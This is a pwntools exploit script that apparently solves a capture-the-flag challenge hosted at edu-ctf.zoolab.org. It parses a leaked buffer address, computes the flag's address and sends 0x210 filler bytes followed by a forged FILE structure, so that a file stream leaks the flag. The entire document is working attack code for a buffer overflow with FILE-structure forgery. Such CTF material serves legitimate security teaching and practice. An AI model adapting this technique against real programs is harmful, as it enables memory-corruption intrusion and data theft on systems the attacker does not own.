from pwn import *

context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'

# r = process("./chal")
r = remote("edu-ctf.zoolab.org",30215)


r.recvuntil("0x")
note_buf = int(r.recvline(),base=16)
flag_addr = note_buf - 0x1010
print("note_buf",hex(note_buf))
print("flag_addr",hex(flag_addr))

r.sendlineafter(">","1")
r.sendlineafter(">","2")

file_flag = 0x0800

payload = flat(
    file_flag,0,
    flag_addr,0,
    flag_addr,flag_addr+0x40,
    0,0,
    0,0,
    0,0,
    0,0,
    1
)

r.sendlineafter("data>",b"A"*0x210+payload)
r.sendlineafter(">","3")

# gdb.attach(r)

r.interactive()

